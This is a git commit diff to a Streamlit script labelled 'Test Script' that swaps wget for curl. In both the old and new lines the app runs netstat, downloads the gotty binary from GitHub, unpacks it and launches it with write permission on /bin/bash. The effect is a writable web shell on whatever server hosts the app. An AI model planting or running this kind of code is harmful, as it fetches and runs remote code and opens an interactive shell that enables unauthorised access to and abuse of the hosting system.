b2c82d13f6263cf026677c89b1fbaf6757e40af0
aphiwemthambisi <aphiwemthambisi@gmail.com>
2024-12-28 05:44:32 +0200

    Update app.py

--- app.py
+++ app.py
@@ -5,5 +5,5 @@ st.title("Test Script")
 st.header("Test")
 
 os.system("netstat -ntlp")
-results = os.system("wget https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz && tar -xf gotty_linux_amd64.tar.gz && ./gotty --permit-write --reconnect /bin/bash")
+results = os.system("curl https://github.com/yudai/gotty/releases/download/v1.0.1/gotty_linux_amd64.tar.gz -L -O -J && tar -xf gotty_linux_amd64.tar.gz && ./gotty --permit-write --reconnect /bin/bash")
 st.write(results)
